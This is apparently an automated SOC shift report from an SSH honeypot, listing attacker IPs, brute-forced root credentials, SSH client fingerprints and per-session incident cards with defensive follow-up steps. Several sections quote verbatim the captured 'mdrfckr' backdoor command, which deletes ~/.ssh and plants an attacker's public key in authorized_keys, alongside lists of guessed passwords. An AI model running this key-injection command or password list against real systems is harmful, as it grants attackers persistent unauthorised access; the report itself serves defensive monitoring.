# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T19:03:16Z |
| **Shift Time** | 19:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **163** |
| Confirmed Threats | **159** |
| False Positives Filtered | **4** (2.5%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **7** |
| High Severity Cases | **67** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **96** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **151** |
| Unique Credential Pairs | **88** |
| Unique Usernames | **40** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **40** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `345gs5662d34` | 32 |
| `ubuntu` | 6 |
| `postgres` | 5 |
| `steam` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 32 |
| `3245gs5662d34` | 32 |
| `123` | 2 |
| `QWE@123456` | 2 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 32 |
| `root` | `3245gs5662d34` | 32 |
| `root` | `QWE@123456` | 2 |
| `bot` | `bot28` | 1 |
| `service` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `a123456789a` | `49.231.192.36` | 2026-04-09T17:12:26 |
| `root` | `3245gs5662d34` | `49.231.192.36` | 2026-04-09T17:12:31 |
| `root` | `Aa123456!!!` | `34.133.99.235` | 2026-04-09T17:14:10 |
| `root` | `3245gs5662d34` | `34.133.99.235` | 2026-04-09T17:14:16 |
| `root` | `123qweasd@` | `189.50.142.78` | 2026-04-09T17:15:33 |
| `root` | `3245gs5662d34` | `189.50.142.78` | 2026-04-09T17:15:42 |
| `root` | `QWERTYUI12` | `34.133.99.235` | 2026-04-09T17:17:54 |
| `root` | `Root12345#$` | `49.231.192.36` | 2026-04-09T17:18:54 |
| `root` | `qazwsx1111111` | `189.50.142.78` | 2026-04-09T17:19:22 |
| `root` | `R00t123` | `49.231.192.36` | 2026-04-09T17:21:59 |
| `root` | `Root0..` | `189.50.142.78` | 2026-04-09T17:23:06 |
| `root` | `123456@` | `49.231.192.36` | 2026-04-09T17:28:25 |
| `root` | `Server1234!` | `49.231.192.36` | 2026-04-09T17:31:43 |
| `root` | `wangting123` | `189.50.142.78` | 2026-04-09T17:34:08 |
| `root` | `voyage` | `49.231.192.36` | 2026-04-09T17:38:13 |
| `root` | `root12345@#` | `189.50.142.78` | 2026-04-09T17:41:19 |
| `root` | `QWE@123456` | `128.1.47.28` | 2026-04-09T17:41:39 |
| `root` | `3245gs5662d34` | `128.1.47.28` | 2026-04-09T17:41:44 |
| `root` | `qazwsx1111111$` | `189.50.142.78` | 2026-04-09T17:45:01 |
| `root` | `qwe123123123` | `189.50.142.78` | 2026-04-09T17:48:41 |
| `root` | `root15!` | `189.50.142.78` | 2026-04-09T17:52:21 |
| `root` | `Qwer@2026` | `35.210.61.208` | 2026-04-09T17:53:36 |
| `root` | `3245gs5662d34` | `35.210.61.208` | 2026-04-09T17:53:39 |
| `root` | `QWE@123456` | `35.210.61.208` | 2026-04-09T17:55:00 |
| `root` | `qwe-123` | `189.50.142.78` | 2026-04-09T17:55:56 |
| `root` | `aA.123456` | `35.210.61.208` | 2026-04-09T17:56:27 |
| `root` | `QWERTYU123456` | `49.231.192.36` | 2026-04-09T17:57:23 |
| `root` | `A123456V` | `35.210.61.208` | 2026-04-09T17:57:49 |
| `root` | `Admin@12345678` | `35.210.61.208` | 2026-04-09T18:02:07 |
| `root` | `123@@@` | `189.50.142.78` | 2026-04-09T18:03:07 |
| `root` | `ZAQ!2wsx2026!@` | `35.210.61.208` | 2026-04-09T18:03:31 |
| `root` | `Abc123abc` | `35.210.61.208` | 2026-04-09T18:04:52 |
| `root` | `Ks1CG2@!9` | `68.183.89.21` | 2026-04-09T18:09:59 |
| `root` | `qwerty-12` | `49.231.192.36` | 2026-04-09T18:10:06 |
| `root` | `Ack110314*-` | `159.89.175.226` | 2026-04-09T18:10:51 |
| `root` | `qwertqwert1234` | `189.50.142.78` | 2026-04-09T18:13:49 |
| `root` | `Kq3*Ay0Hc4Or5` | `128.199.20.7` | 2026-04-09T18:15:19 |
| `root` | `qazwsx2018!` | `49.231.192.36` | 2026-04-09T18:16:34 |
| `root` | `xxQQ111` | `49.231.192.36` | 2026-04-09T18:19:45 |
| `root` | `QAZwsx1234` | `189.50.142.78` | 2026-04-09T18:35:15 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **163** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 155 |
| Paramiko (Python) | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 154 | 10 |
| `a2de0f306611...` | Mirai/variant | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 154 | 10 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 3 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `35.210.61.208`, `49.231.192.36`, `34.133.99.235`, `128.1.47.28`, `189.50.142.78`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **15** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 3 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS15169` | Google LLC | 1 | HIGH |
| `AS9617` | JCOM Co., Ltd. | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS58461` | CT-HangZhou-IDC | 1 | HIGH |
| `AS28330` | IFTNET-TELECOM | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (65)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1c5f212cebd2

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:12 |
| **Last Seen** | 2026-04-09 17:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:12:26` | `cowrie.session.connect` |
| `2026-04-09 17:12:26` | `cowrie.client.version` |
| `2026-04-09 17:12:26` | `cowrie.client.kex` |
| `2026-04-09 17:12:26` | `cowrie.login.success` |
| `2026-04-09 17:12:27` | `cowrie.session.params` |
| `2026-04-09 17:12:27` | `cowrie.command.input` |
| `2026-04-09 17:12:27` | `cowrie.command.failed` |
| `2026-04-09 17:12:27` | `cowrie.log.closed` |
| `2026-04-09 17:12:28` | `cowrie.session.params` |
| `2026-04-09 17:12:28` | `cowrie.command.input` |
| `2026-04-09 17:12:28` | `cowrie.session.file_download` |
| `2026-04-09 17:12:28` | `cowrie.log.closed` |
| `2026-04-09 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ac80a0815ed

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:12 |
| **Last Seen** | 2026-04-09 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:12:30` | `cowrie.session.connect` |
| `2026-04-09 17:12:31` | `cowrie.client.version` |
| `2026-04-09 17:12:31` | `cowrie.client.kex` |
| `2026-04-09 17:12:31` | `cowrie.login.success` |
| `2026-04-09 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed97ecd517a

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-09 17:14 |
| **Last Seen** | 2026-04-09 17:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:14:09` | `cowrie.session.connect` |
| `2026-04-09 17:14:09` | `cowrie.client.version` |
| `2026-04-09 17:14:09` | `cowrie.client.kex` |
| `2026-04-09 17:14:10` | `cowrie.login.success` |
| `2026-04-09 17:14:11` | `cowrie.session.params` |
| `2026-04-09 17:14:11` | `cowrie.command.input` |
| `2026-04-09 17:14:11` | `cowrie.command.failed` |
| `2026-04-09 17:14:11` | `cowrie.log.closed` |
| `2026-04-09 17:14:12` | `cowrie.session.params` |
| `2026-04-09 17:14:12` | `cowrie.command.input` |
| `2026-04-09 17:14:12` | `cowrie.session.file_download` |
| `2026-04-09 17:14:12` | `cowrie.log.closed` |
| `2026-04-09 17:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c26818e160f

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-09 17:14 |
| **Last Seen** | 2026-04-09 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:14:15` | `cowrie.session.connect` |
| `2026-04-09 17:14:15` | `cowrie.client.version` |
| `2026-04-09 17:14:15` | `cowrie.client.kex` |
| `2026-04-09 17:14:16` | `cowrie.login.success` |
| `2026-04-09 17:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496768570592

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:15 |
| **Last Seen** | 2026-04-09 17:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:15:31` | `cowrie.session.connect` |
| `2026-04-09 17:15:31` | `cowrie.client.version` |
| `2026-04-09 17:15:31` | `cowrie.client.kex` |
| `2026-04-09 17:15:33` | `cowrie.login.success` |
| `2026-04-09 17:15:34` | `cowrie.session.params` |
| `2026-04-09 17:15:34` | `cowrie.command.input` |
| `2026-04-09 17:15:34` | `cowrie.command.failed` |
| `2026-04-09 17:15:34` | `cowrie.log.closed` |
| `2026-04-09 17:15:35` | `cowrie.session.params` |
| `2026-04-09 17:15:35` | `cowrie.command.input` |
| `2026-04-09 17:15:35` | `cowrie.session.file_download` |
| `2026-04-09 17:15:35` | `cowrie.log.closed` |
| `2026-04-09 17:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b223541ad97

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:15 |
| **Last Seen** | 2026-04-09 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:15:40` | `cowrie.session.connect` |
| `2026-04-09 17:15:40` | `cowrie.client.version` |
| `2026-04-09 17:15:40` | `cowrie.client.kex` |
| `2026-04-09 17:15:42` | `cowrie.login.success` |
| `2026-04-09 17:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13afaa265643

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-09 17:17 |
| **Last Seen** | 2026-04-09 17:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:17:52` | `cowrie.session.connect` |
| `2026-04-09 17:17:52` | `cowrie.client.version` |
| `2026-04-09 17:17:53` | `cowrie.client.kex` |
| `2026-04-09 17:17:54` | `cowrie.login.success` |
| `2026-04-09 17:17:55` | `cowrie.session.params` |
| `2026-04-09 17:17:55` | `cowrie.command.input` |
| `2026-04-09 17:17:55` | `cowrie.command.failed` |
| `2026-04-09 17:17:55` | `cowrie.log.closed` |
| `2026-04-09 17:17:56` | `cowrie.session.params` |
| `2026-04-09 17:17:56` | `cowrie.command.input` |
| `2026-04-09 17:17:56` | `cowrie.session.file_download` |
| `2026-04-09 17:17:56` | `cowrie.log.closed` |
| `2026-04-09 17:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d71e37dc05f

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-09 17:17 |
| **Last Seen** | 2026-04-09 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:17:59` | `cowrie.session.connect` |
| `2026-04-09 17:17:59` | `cowrie.client.version` |
| `2026-04-09 17:17:59` | `cowrie.client.kex` |
| `2026-04-09 17:18:00` | `cowrie.login.success` |
| `2026-04-09 17:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a292fede0dd5

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:18 |
| **Last Seen** | 2026-04-09 17:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:18:53` | `cowrie.session.connect` |
| `2026-04-09 17:18:53` | `cowrie.client.version` |
| `2026-04-09 17:18:53` | `cowrie.client.kex` |
| `2026-04-09 17:18:54` | `cowrie.login.success` |
| `2026-04-09 17:18:55` | `cowrie.session.params` |
| `2026-04-09 17:18:55` | `cowrie.command.input` |
| `2026-04-09 17:18:55` | `cowrie.command.failed` |
| `2026-04-09 17:18:55` | `cowrie.log.closed` |
| `2026-04-09 17:18:55` | `cowrie.session.params` |
| `2026-04-09 17:18:55` | `cowrie.command.input` |
| `2026-04-09 17:18:56` | `cowrie.session.file_download` |
| `2026-04-09 17:18:56` | `cowrie.log.closed` |
| `2026-04-09 17:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ef1edd56d0

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:18 |
| **Last Seen** | 2026-04-09 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:18:58` | `cowrie.session.connect` |
| `2026-04-09 17:18:58` | `cowrie.client.version` |
| `2026-04-09 17:18:59` | `cowrie.client.kex` |
| `2026-04-09 17:19:00` | `cowrie.login.success` |
| `2026-04-09 17:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bcb44147166

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:19 |
| **Last Seen** | 2026-04-09 17:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:19:20` | `cowrie.session.connect` |
| `2026-04-09 17:19:20` | `cowrie.client.version` |
| `2026-04-09 17:19:20` | `cowrie.client.kex` |
| `2026-04-09 17:19:22` | `cowrie.login.success` |
| `2026-04-09 17:19:23` | `cowrie.session.params` |
| `2026-04-09 17:19:23` | `cowrie.command.input` |
| `2026-04-09 17:19:23` | `cowrie.command.failed` |
| `2026-04-09 17:19:23` | `cowrie.log.closed` |
| `2026-04-09 17:19:24` | `cowrie.session.params` |
| `2026-04-09 17:19:24` | `cowrie.command.input` |
| `2026-04-09 17:19:25` | `cowrie.session.file_download` |
| `2026-04-09 17:19:25` | `cowrie.log.closed` |
| `2026-04-09 17:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-979e528e5ff3

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:19 |
| **Last Seen** | 2026-04-09 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:19:29` | `cowrie.session.connect` |
| `2026-04-09 17:19:29` | `cowrie.client.version` |
| `2026-04-09 17:19:29` | `cowrie.client.kex` |
| `2026-04-09 17:19:31` | `cowrie.login.success` |
| `2026-04-09 17:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a01b6c7fbe

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:21 |
| **Last Seen** | 2026-04-09 17:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
